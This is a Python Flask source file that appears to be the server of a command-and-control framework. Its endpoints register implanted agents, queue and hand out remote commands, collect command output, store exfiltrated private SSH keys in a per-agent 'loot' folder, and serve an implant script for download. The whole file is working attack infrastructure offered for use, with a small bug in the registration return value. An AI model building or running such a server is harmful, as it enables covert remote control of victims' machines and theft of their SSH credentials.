import os
from datetime import datetime

from flask import Blueprint, abort, request, send_from_directory

from c2 import Agent, Command
from c2.app import app, db

bp = Blueprint("api", __name__)


@app.route("/api/1.1/register_agent", methods=["POST"])
def register_agent():
    """API endpoint that allows an agent to register
    itself to the server

    :returns: the new agent ID
    :rtype: str
    """
    if request.method == "POST":
        agent_info = request.json
        if agent_info:
            args = [str(agent_info["Stats"][key]) for key in agent_info["Stats"]]
            args += [str(agent_info["total"])]
            args += [agent_info["IP"]]
            args += [agent_info["USERNAME"]]
            args += [agent_info["SleepTime"]]
            new_agent = Agent(*args)
            db.session.add(new_agent)
            db.session.flush()
            agent_id = new_agent.id
            db.session.commit()
            os.mkdir(f"loot/agent_{agent_id}")
            return str(id)
        return "Bad Request"


@app.route("/api/1.1/get_command", methods=["POST"])
def get_command():
    """API endpoint that allows an agent to fetch
    commands from the server

    :returns: none if there are no commands to retrieve,
    else the command and it's ID
    :rtype: str
    """
    if request.method == "POST":
        command_data = request.json
        if command_data:
            agent_id = int(command_data["id"])
            agent = Agent.query.filter(Agent.id == agent_id).first()
            curr_time = datetime.now()
            agent.lastSeen = curr_time.strftime("%d %B, %Y %H:%M:%S")
            res = Command.query.filter(
                Command.agentID == agent_id, Command.retrieved == False
            ).first()
            if res is None:
                db.session.commit()
                db.session.flush()
                return "None"
            res.retrieved = True
            db.session.flush()
            db.session.commit()
            return res.command + "," + str(res.commandID)
        return "Bad Request"


@app.route("/api/1.1/command_out", methods=["POST"])
def command_out():
    """API endpoint that allows an agent to send
    output of commands back to the server

    :returns: status to the agent of whether it received the output
    :rtype: str
    """
    print(request.method)
    if request.method == "POST":
        json = request.json
        if json:
            output = json["output"]
            agentID = json["agentID"]
            commandID = json["commandID"]
            command = Command.query.filter(
                Command.agentID == agentID, Command.commandID == commandID
            ).first()
            command.output = output
            db.session.flush()
            db.session.commit()
            return "Received"
        return "Bad Request"


@app.route("/api/1.1/ssh_keys", methods=["POST"])
def ssh_keys():
    """API endpoint that allows an agent to send back exfiltrated
    private ssh keys

    :returns: status to the agent of whether it received the keys
    :rtype: str
    """
    if request.method == "POST":
        json = request.json
        if json:
            key_dict = json["keys"]
            agent_id = json["id"]
            with open(f"loot/agent_{agent_id}/ssh_keys.txt", "a+") as file:
                for key in key_dict:
                    file.write(f"{key}: {key_dict[key]}\n")
            return "[*] Received SSH keys"
        return "Bad Request"


@app.route("/api/1.1/retrieve_scripts", methods=["GET"])
def scripts():
    """API endpoint that allows an agent to retrieve scripts
    from the server

    :returns: files that the agent requested
    :rtype: file
    """
    try:
        return send_from_directory(
            "implant", path="implant.py", filename="implant.py", as_attachment=True
        )
    except FileNotFoundError:
        abort(404)
